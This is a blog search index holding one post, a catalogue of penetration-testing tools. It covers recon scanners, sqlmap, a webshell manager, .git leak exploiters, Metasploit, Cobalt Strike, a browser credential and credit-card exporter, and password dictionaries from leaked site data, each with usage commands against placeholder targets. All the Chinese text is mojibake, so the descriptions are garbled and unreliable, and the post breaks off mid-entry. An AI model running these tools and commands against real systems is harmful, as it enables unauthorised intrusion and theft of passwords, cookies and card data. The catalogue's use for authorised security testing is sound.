<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ¸—é€å·¥å…·åˆé›†</title>
      <link href="/post/9448a947.html"/>
      <url>/post/9448a947.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ¸—é€å·¥å…·åˆé›†"><a href="#æ¸—é€å·¥å…·åˆé›†" class="headerlink" title="æ¸—é€å·¥å…·åˆé›†"></a>æ¸—é€å·¥å…·åˆé›†</h1><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ç½‘ç»œæœåŠ¡å‘ç°"><a href="#1-ç½‘ç»œæœåŠ¡å‘ç°" class="headerlink" title="1. ç½‘ç»œæœåŠ¡å‘ç°"></a>1. ç½‘ç»œæœåŠ¡å‘ç°</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>Github: <a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>ç®€ä»‹ï¼šä¸€æ¬¾ç”¨äºç½‘ç»œå‘ç°å’Œå®‰å…¨å®¡è®¡çš„ç½‘ç»œå®‰å…¨å·¥å…·ã€‚</p><h3 id="2-æŒ‡çº¹è¯†åˆ«"><a href="#2-æŒ‡çº¹è¯†åˆ«" class="headerlink" title="2. æŒ‡çº¹è¯†åˆ«"></a>2. æŒ‡çº¹è¯†åˆ«</h3><h4 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h4><p>Github: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>ç®€ä»‹ï¼šWeb åº”ç”¨ç¨‹åºé˜²ç«å¢™æŒ‡çº¹è¯†åˆ«å·¥å…·ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">wafw00f https://example.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>å®˜ç½‘ï¼š<a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a><br>ç®€ä»‹ï¼šæµè§ˆå™¨æ’ä»¶ï¼Œæ‰¾å‡ºä»»ä½•ç½‘ç«™çš„æŠ€æœ¯å †æ ˆã€‚<br>â€‹</p><h4 id="TideFinger"><a href="#TideFinger" class="headerlink" title="TideFinger"></a>TideFinger</h4><p>Github: <a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a><br>ç®€ä»‹ï¼šä¸€ä¸ªå¼€æºçš„æŒ‡çº¹è¯†åˆ«å°å·¥å…·ï¼Œä½¿ç”¨äº†ä¼ ç»Ÿå’Œç°ä»£æ£€æµ‹æŠ€æœ¯ç›¸ç»“åˆçš„æŒ‡çº¹æ£€æµ‹æ–¹æ³•ï¼Œè®©æŒ‡çº¹æ£€æµ‹æ›´å¿«æ·ã€å‡†ç¡®ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python3 TideFinger.py -u http://target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-Web-è·¯å¾„æ‰«æ"><a href="#3-Web-è·¯å¾„æ‰«æ" class="headerlink" title="3. Web è·¯å¾„æ‰«æ"></a>3. Web è·¯å¾„æ‰«æ</h3><h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>Github: <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>ç®€ä»‹ï¼šä¸€ç§é«˜çº§å‘½ä»¤è¡Œå·¥å…·ï¼Œæ—¨åœ¨æš´åŠ›ç ´è§£ç½‘ç»œæœåŠ¡å™¨ä¸­çš„ç›®å½•å’Œæ–‡ä»¶ï¼Œåˆåç½‘ç»œè·¯å¾„æ‰«æå™¨ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python3 dirsearch.py -u <span class="token operator">&lt;</span>URL<span class="token operator">></span> -e <span class="token operator">&lt;</span>EXTENSIONS<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h4><p>Github: <a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a><br>ç®€ä»‹ï¼šä¸€ä¸ªé«˜çº§ web ç›®å½•æ‰«æå·¥å…·ï¼ŒåŠŸèƒ½å°†ä¼šå¼ºäº DirBusterã€Dirsearchã€cansinaã€å¾¡å‰‘ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python3 dirmap.py -i https://target.com -lcf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="DirBuster"><a href="#DirBuster" class="headerlink" title="DirBuster"></a>DirBuster</h4><p>Github: <a href="https://github.com/thinkoaa/DirBusterUpgradedVersion">https://github.com/thinkoaa/DirBusterUpgradedVersion</a><br>ç®€ä»‹ï¼šDirBuster ä¼˜åŒ–ç‰ˆæœ¬ï¼Œä¸­æ–‡ç•Œé¢ã€‚<br>â€‹</p><h3 id="4-å­åŸŸåæ”¶é›†"><a href="#4-å­åŸŸåæ”¶é›†" class="headerlink" title="4. å­åŸŸåæ”¶é›†"></a>4. å­åŸŸåæ”¶é›†</h3><h4 id="ksubdomain"><a href="#ksubdomain" class="headerlink" title="ksubdomain"></a>ksubdomain</h4><p>Github: <a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br>ç®€ä»‹ï¼šä¸€æ¬¾åŸºäºæ— çŠ¶æ€å­åŸŸåçˆ†ç ´å·¥å…·ï¼Œæ”¯æŒåœ¨ Windows/Linux/Mac ä¸Šä½¿ç”¨ï¼Œå®ƒä¼šå¾ˆå¿«çš„è¿›è¡Œ DNS çˆ†ç ´ï¼Œåœ¨ Mac å’Œ Windows ä¸Šç†è®ºæœ€å¤§å‘åŒ…é€Ÿåº¦åœ¨ 30w/s,linux ä¸Šä¸º 160w/s çš„é€Ÿåº¦ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ä½¿ç”¨å†…ç½®å­—å…¸çˆ†ç ´</span>ksubdomain -d seebug.org<span class="token comment" spellcheck="true"># ä½¿ç”¨å­—å…¸çˆ†ç ´åŸŸå</span>ksubdomain -d seebug.org -f subdomains.dict<span class="token comment" spellcheck="true"># ä»…ä½¿ç”¨ç½‘ç»œAPIæ¥å£è·å–åŸŸå</span>ksubdomain -d target.org -api<span class="token comment" spellcheck="true"># å®Œæ•´æ¨¡å¼,å…ˆä½¿ç”¨ç½‘ç»œAPIï¼Œåœ¨æ­¤åŸºç¡€ä½¿ç”¨å†…ç½®å­—å…¸è¿›è¡Œçˆ†ç ´</span>ksubdomain -d target.org -full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>Github: <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>ç®€ä»‹ï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å­åŸŸæ”¶é›†å·¥å…·ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./example.txt run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="äºŒã€æŠ“åŒ…æ”¹åŒ…"><a href="#äºŒã€æŠ“åŒ…æ”¹åŒ…" class="headerlink" title="äºŒã€æŠ“åŒ…æ”¹åŒ…"></a>äºŒã€æŠ“åŒ…æ”¹åŒ…</h2><h4 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h4><p>å®˜ç½‘ï¼š<a href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>ç®€ä»‹ï¼šhttp(s)æŠ“åŒ…å·¥å…·ï¼Œä¸€æµçš„æ¼æ´æ‰«æã€æ¸—é€æµ‹è¯•å’Œ Web åº”ç”¨å®‰å…¨å¹³å°ã€‚<br>â€‹</p><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h4><p>å®˜ç½‘ï¼š<a href="https://www.wireshark.org/">https://www.wireshark.org/</a><br>ç®€ä»‹ï¼šä¸€ä¸ªç½‘ç»œæ•°æ®åŒ…åˆ†æè½¯ä»¶ã€‚</p><h2 id="ä¸‰ã€æ¼æ´æ‰«æ"><a href="#ä¸‰ã€æ¼æ´æ‰«æ" class="headerlink" title="ä¸‰ã€æ¼æ´æ‰«æ"></a>ä¸‰ã€æ¼æ´æ‰«æ</h2><h3 id="1-ä¸»æœºæ¼æ´æ‰«æ"><a href="#1-ä¸»æœºæ¼æ´æ‰«æ" class="headerlink" title="1. ä¸»æœºæ¼æ´æ‰«æ"></a>1. ä¸»æœºæ¼æ´æ‰«æ</h3><h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p>å®˜ç½‘ï¼š<a href="https://zh-cn.tenable.com/products/nessus">https://zh-cn.tenable.com/products/nessus</a><br>ç®€ä»‹ï¼šä¸»æœºå’Œ Web æ¼æ´æ‰«æè¯„ä¼°å·¥å…·ã€‚</p><h4 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h4><p>Githubï¼š<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>ç®€ä»‹ï¼šä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚<br>æ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redis æ‰¹é‡å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹ shellã€è¯»å– win ç½‘å¡ä¿¡æ¯ã€web æŒ‡çº¹è¯†åˆ«ã€web æ¼æ´æ‰«æã€netbios æ¢æµ‹ã€åŸŸæ§è¯†åˆ«ç­‰åŠŸèƒ½ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">fscan.exe -h 192.168.1.1/24  <span class="token punctuation">(</span>é»˜è®¤ä½¿ç”¨å…¨éƒ¨æ¨¡å—<span class="token punctuation">)</span>fscan.exe -h 192.168.1.1/16  <span class="token punctuation">(</span>Bæ®µæ‰«æ<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-Web-æ¼æ´æ‰«æ"><a href="#2-Web-æ¼æ´æ‰«æ" class="headerlink" title="2. Web æ¼æ´æ‰«æ"></a>2. Web æ¼æ´æ‰«æ</h3><h4 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h4><p>å®˜ç½‘ï¼š<a href="https://www.acunetix.com/vulnerability-scanner/">https://www.acunetix.com/vulnerability-scanner/</a><br>ç®€ä»‹ï¼šWeb ç½‘ç»œæ¼æ´æ‰«æå™¨ã€‚</p><h4 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h4><p>Github: <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a><br>ç®€ä»‹ï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å®‰å…¨è¯„ä¼°å·¥å…·ã€‚<br>ä½¿ç”¨ï¼š<br>ã€<a href="https://docs.xray.cool/">ä½¿ç”¨æ–‡æ¡£</a>ã€‘</p><pre class="line-numbers language-bash"><code class="language-bash">1. ä½¿ç”¨åŸºç¡€çˆ¬è™«çˆ¬å–å¹¶å¯¹çˆ¬è™«çˆ¬å–çš„é“¾æ¥è¿›è¡Œæ¼æ´æ‰«æxray webscan --basic-crawler http://example.com --html-output vuln.html2.ä½¿ç”¨ HTTP ä»£ç†è¿›è¡Œè¢«åŠ¨æ‰«æxray webscan --listen 127.0.0.1:7777 --html-output proxy.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pocsuite3"><a href="#pocsuite3" class="headerlink" title="pocsuite3"></a>pocsuite3</h4><p>Githubï¼š<a href="https://github.com/knownsec/pocsuite3">https://github.com/knownsec/pocsuite3</a><br>ç®€ä»‹ï¼šPocsuite æ˜¯ç”±çŸ¥é“åˆ›å®‡ 404 å®éªŒå®¤æ‰“é€ çš„ä¸€æ¬¾å¼€æºçš„è¿œç¨‹æ¼æ´æµ‹è¯•æ¡†æ¶ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># load all poc in the poc directory and save the result as html</span>pocsuite -u http://example.com --plugins poc_from_pocs,html_report<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h4><p>Github: <a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>ç®€ä»‹ï¼šNikto ç½‘ç»œæœåŠ¡å™¨æ‰«æå™¨<br>ä½¿ç”¨ï¼š<br>ã€<a href="https://github.com/sullo/nikto/wiki">nikto wiki</a>ã€‘</p><pre class="line-numbers language-bash"><code class="language-bash">nikto -h http://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h4><p>Githubï¼š<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>ç®€ä»‹ï¼šXSS æ¼æ´æµ‹è¯•å·¥å…·<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python xsstrike.py -u <span class="token string">"http://example.com/search.php?q=query"</span>python xsstrike.py -u <span class="token string">"http://example.com/search.php"</span> --data <span class="token string">"q=query"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€æ¼æ´åˆ©ç”¨"><a href="#å››ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="å››ã€æ¼æ´åˆ©ç”¨"></a>å››ã€æ¼æ´åˆ©ç”¨</h2><h3 id="1-Web-æ¼æ´åˆ©ç”¨"><a href="#1-Web-æ¼æ´åˆ©ç”¨" class="headerlink" title="1. Web æ¼æ´åˆ©ç”¨"></a>1. Web æ¼æ´åˆ©ç”¨</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>Github: <a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>ç®€ä»‹ï¼š SQL æ³¨å…¥æ¼æ´æ‰«æå’Œåˆ©ç”¨å·¥å…·ã€‚<br>ä½¿ç”¨:<br>ã€<a href="https://saucer-man.com/information_security/37.html">sqlmap ä¸­æ–‡ä½¿ç”¨æ‰‹å†Œ</a>ã€‘</p><h4 id="ä¸­å›½èšå‰‘"><a href="#ä¸­å›½èšå‰‘" class="headerlink" title="ä¸­å›½èšå‰‘"></a>ä¸­å›½èšå‰‘</h4><p>Github: <a href="https://github.com/AntSwordProject/AntSword">https://github.com/AntSwordProject/AntSword</a><br>ç®€ä»‹ï¼šä¸€æ¬¾å¼€æºçš„è·¨å¹³å°ç½‘ç«™ç®¡ç†å·¥å…·ï¼Œå®ƒä¸»è¦é¢å‘äºåˆæ³•æˆæƒçš„æ¸—é€æµ‹è¯•å®‰å…¨äººå‘˜ä»¥åŠè¿›è¡Œå¸¸è§„æ“ä½œçš„ç½‘ç«™ç®¡ç†å‘˜ã€‚</p><h3 id="2-ä¿¡æ¯æ³„æ¼åˆ©ç”¨"><a href="#2-ä¿¡æ¯æ³„æ¼åˆ©ç”¨" class="headerlink" title="2. ä¿¡æ¯æ³„æ¼åˆ©ç”¨"></a>2. ä¿¡æ¯æ³„æ¼åˆ©ç”¨</h3><h4 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a>GitHack</h4><p>Github: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>ç®€ä»‹ï¼šä¸€ä¸ª.git æ³„éœ²åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„.git æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œé‡å»ºè¿˜åŸå·¥ç¨‹æºä»£ç ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python GitHack.py http://target/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="superl-githack"><a href="#superl-githack" class="headerlink" title="superl-githack"></a>superl-githack</h4><p>Github: <a href="https://github.com/super-l/superl-githack">https://github.com/super-l/superl-githack</a><br>ç®€ä»‹ï¼š.git ä¿¡æ¯æ³„éœ²æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œå¯è‡ªåŠ¨å®Œæ•´çš„ä¸‹è½½æ•´ä¸ªé¡¹ç›® GIT å·¥ç¨‹æ–‡ä»¶ã€è·å¾—ä» git é¡¹ç›®åˆ›å»ºä»¥æ¥çš„æ‰€æœ‰æ›´æ–°å†ç¨‹å’Œæºä»£ç ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python superl-githack.py http://www.xxx.com/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ds-store-exp"><a href="#ds-store-exp" class="headerlink" title="ds_store_exp"></a>ds_store_exp</h4><p>Github: <a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>ç®€ä»‹ï¼šä¸€ä¸ª .DS_Store æ–‡ä»¶æ³„æ¼åˆ©ç”¨è„šæœ¬ï¼Œå®ƒè§£æ.DS_Store æ–‡ä»¶å¹¶é€’å½’åœ°ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python ds_store_exp.py http://www.example.com/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="dvcs-ripper"><a href="#dvcs-ripper" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h4><p>Github: <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>ç®€ä»‹ï¼šä¸€æ¬¾ perl çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ä¿¡æ¯æ³„éœ²åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒ SVN, GIT, Mercurial/hg, bz ç­‰ç­‰ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">rip-git.pl -v -u http://www.example.com/.git/rip-hg.pl -v -u http://www.example.com/.hg/rip-bzr.pl -v -u http://www.example.com/.bzr/rip-svn.pl -v -u http://www.example.com/.svn/rip-cvs.pl -v -u http://www.example.com/CVS/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="idea-exploit"><a href="#idea-exploit" class="headerlink" title="idea_exploit"></a>idea_exploit</h4><p>Githubï¼š<a href="https://github.com/lijiejie/idea_exploit">https://github.com/lijiejie/idea_exploit</a></p><p>ç®€ä»‹ï¼šIDE é…ç½®æ–‡ä»¶å¤¹ï¼ˆ.ideaï¼‰æ•æ„Ÿä¿¡æ¯æ³„éœ²åˆ©ç”¨å·¥å…·ã€‚</p><p>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python idea_exp.py http://example.com/.idea/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="reverse-sourcemap"><a href="#reverse-sourcemap" class="headerlink" title="reverse-sourcemap"></a>reverse-sourcemap</h4><p>Githubï¼š<a href="https://github.com/davidkevork/reverse-sourcemap">https://github.com/davidkevork/reverse-sourcemap</a><br>ç®€ä»‹ï¼šxxx.js.map é€†å‘è¿˜åŸå·¥å…·<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">reverse-sourcemap -v xxx.xxx.js.map -o code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äº”ã€ä»£ç å®¡è®¡"><a href="#äº”ã€ä»£ç å®¡è®¡" class="headerlink" title="äº”ã€ä»£ç å®¡è®¡"></a>äº”ã€ä»£ç å®¡è®¡</h2><h4 id="Kunlun-M"><a href="#Kunlun-M" class="headerlink" title="Kunlun-M"></a><strong>Kunlun-M</strong></h4><p>Githubï¼š<a href="https://github.com/LoRexxar/Kunlun-M">https://github.com/LoRexxar/Kunlun-M</a><br>ç®€ä»‹ï¼šKunLun-M æ˜¯ä¸€ä¸ªå®Œå…¨å¼€æºçš„é™æ€ç™½ç›’æ‰«æå·¥å…·ï¼Œæ”¯æŒ PHPã€JavaScript çš„è¯­ä¹‰æ‰«æï¼ŒåŸºç¡€å®‰å…¨ã€ç»„ä»¶å®‰å…¨æ‰«æï¼ŒChrome Ext\Solidity çš„åŸºç¡€æ‰«æã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">python kunlun.py scan -t tests/vulnerabilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å…­ã€å†…ç½‘æ¸—é€"><a href="#å…­ã€å†…ç½‘æ¸—é€" class="headerlink" title="å…­ã€å†…ç½‘æ¸—é€"></a>å…­ã€å†…ç½‘æ¸—é€</h2><h4 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h4><p>å®˜ç½‘ï¼š<a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>ç®€ä»‹ï¼šä¸€æ¬¾å¼€æºçš„å®‰å…¨æ¼æ´æ£€æµ‹å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©å®‰å…¨å’Œ IT ä¸“ä¸šäººå£«è¯†åˆ«å®‰å…¨æ€§é—®é¢˜ï¼ŒéªŒè¯æ¼æ´çš„ç¼“è§£æªæ–½ï¼Œå¹¶ç®¡ç†ä¸“å®¶é©±åŠ¨çš„å®‰å…¨æ€§è¿›è¡Œè¯„ä¼°ï¼Œæä¾›çœŸæ­£çš„å®‰å…¨é£é™©æƒ…æŠ¥ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># å¯åŠ¨</span>msfconsole<span class="token comment" spellcheck="true"># æœç´¢æ¨¡å—</span>search xxx<span class="token comment" spellcheck="true"># ä½¿ç”¨æ¨¡å—</span>use module_name/module_id<span class="token comment" spellcheck="true"># è®¾ç½®å‚æ•°</span><span class="token keyword">set</span> key value<span class="token comment" spellcheck="true"># æ‰§è¡Œ</span>exploit/run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Viper"><a href="#Viper" class="headerlink" title="Viper"></a>Viper</h4><p>Github: <a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a><br>ç®€ä»‹ï¼šä¸€æ¬¾å›¾å½¢åŒ–å†…ç½‘æ¸—é€å·¥å…·,å°†å†…ç½‘æ¸—é€è¿‡ç¨‹ä¸­å¸¸ç”¨çš„æˆ˜æœ¯åŠæŠ€æœ¯è¿›è¡Œæ¨¡å—åŒ–åŠæ­¦å™¨åŒ–ã€‚<br>ä½¿ç”¨æ–‡æ¡£ï¼š<a href="https://www.yuque.com/vipersec">ViperSec</a><br>â€‹</p><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><p>å®˜ç½‘ï¼š<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a><br>ç®€ä»‹ï¼šä¸€æ¬¾å¸¸ç”¨äºåæ¸—é€çš„ç¥å™¨ï¼Œè¿™ä¸ªå·¥å…·ä»¥å›¢é˜Ÿä½œä¸ºä¸»ä½“ï¼Œå…±äº«ä¿¡æ¯ï¼Œæ‹¥æœ‰å¤šç§åè®®ä¸Šçº¿æ–¹å¼ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ï¼Œç«¯å£æ‰«æï¼Œsocket ä»£ç†ï¼Œææƒï¼Œé’“é±¼ç­‰ã€‚é™¤å»è‡ªèº«åŠŸèƒ½å¤–ï¼ŒCobalt Strike è¿˜åˆ©ç”¨äº† Metasploit å’Œ Mimikatz ç­‰å…¶ä»–çŸ¥åå·¥å…·çš„åŠŸèƒ½ã€‚</p><h4 id="HackBrowserData"><a href="#HackBrowserData" class="headerlink" title="HackBrowserData"></a>HackBrowserData</h4><p>Githubï¼š<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>ç®€ä»‹ï¼šä¸€ä¸ªæµè§ˆå™¨æ•°æ®ï¼ˆå¯†ç  | å†å²è®°å½• | Cookie | ä¹¦ç­¾ | ä¿¡ç”¨å¡ | ä¸‹è½½è®°å½•ï¼‰çš„å¯¼å‡ºå·¥å…·ï¼Œæ”¯æŒå…¨å¹³å°ä¸»æµæµè§ˆå™¨ã€‚</p><pre class="line-numbers language-bash"><code class="language-bash">.\hack-browser-data.exe -b all -f json --dir results --cc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸ƒã€å­—å…¸ç›¸å…³"><a href="#ä¸ƒã€å­—å…¸ç›¸å…³" class="headerlink" title="ä¸ƒã€å­—å…¸ç›¸å…³"></a>ä¸ƒã€å­—å…¸ç›¸å…³</h2><h3 id="1-å¸¸ç”¨å­—å…¸"><a href="#1-å¸¸ç”¨å­—å…¸" class="headerlink" title="1. å¸¸ç”¨å­—å…¸"></a>1. å¸¸ç”¨å­—å…¸</h3><h4 id="fuzzDicts"><a href="#fuzzDicts" class="headerlink" title="fuzzDicts"></a>fuzzDicts</h4><p>Githubï¼š<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br>ç®€ä»‹ï¼šWeb Pentesting Fuzz å­—å…¸,ä¸€ä¸ªå°±å¤Ÿäº†ã€‚</p><h4 id="Web-Fuzzing-Box"><a href="#Web-Fuzzing-Box" class="headerlink" title="Web-Fuzzing-Box"></a>Web-Fuzzing-Box</h4><p>Githubï¼š<a href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a><br>ç®€ä»‹ï¼šWeb æ¨¡ç³Šæµ‹è¯•å­—å…¸ä¸ä¸€äº› Payloadsï¼Œä¸»è¦åŒ…å«ï¼šå¼±å£ä»¤æš´åŠ›ç ´è§£ã€ç›®å½•ä»¥åŠæ–‡ä»¶æšä¸¾ã€Web æ¼æ´â€¦</p><h4 id="Dictionary-Of-Pentesting"><a href="#Dictionary-Of-Pentesting" class="headerlink" title="Dictionary-Of-Pentesting"></a>Dictionary-Of-Pentesting</h4><p>Githubï¼š<a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a><br>ç®€ä»‹ï¼šæ”¶é›†ä¸€äº›å¸¸ç”¨çš„å­—å…¸ï¼Œç”¨äºæ¸—é€æµ‹è¯•ã€SRC æ¼æ´æŒ–æ˜ã€çˆ†ç ´ã€Fuzzing ç­‰å®æˆ˜ä¸­ã€‚</p><h4 id="password-brute-dictionary"><a href="#password-brute-dictionary" class="headerlink" title="password_brute_dictionary"></a>password_brute_dictionary</h4><p>Githubï¼š<a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a><br>ç®€ä»‹ï¼šå˜Ÿå˜Ÿç‰›ã€7K7Kã€äººäººç½‘ã€CSDNã€178 æ¸¸æˆç½‘ç­‰äº”ä¸ªå¹³å°çš„æ³„éœ²æ•°æ®å¯†ç å­—å…¸ã€‚</p><h3 id="2-å­—å…¸ç”Ÿæˆ"><a href="#2-å­—å…¸ç”Ÿæˆ" class="headerlink" title="2. å­—å…¸ç”Ÿæˆ"></a>2. å­—å…¸ç”Ÿæˆ</h3><h4 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h4><p>Github: <a href="https://github.com/fpolit/crunch">https://github.com/fpolit/crunch</a><br>ç®€ä»‹ï¼šåˆ›å»ºå¯†ç å­—å…¸å·¥å…·ï¼ŒæŒ‰ç…§æŒ‡å®šçš„è§„åˆ™ç”Ÿæˆå¯†ç å­—å…¸ï¼Œå¯ä»¥çµæ´»çš„åˆ¶å®šè‡ªå·±çš„å­—å…¸æ–‡ä»¶ã€‚<br>ä½¿ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ä½¿ç”¨ç»™å®šçš„å­—ç¬¦(0123456789abcdef)ç”ŸæˆåŒ…å«æœ€å°å’Œæœ€å¤§é•¿åº¦ä¸º6çš„å•è¯çš„å­—å…¸æ–‡ä»¶ï¼Œå¹¶å°†è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶(-0 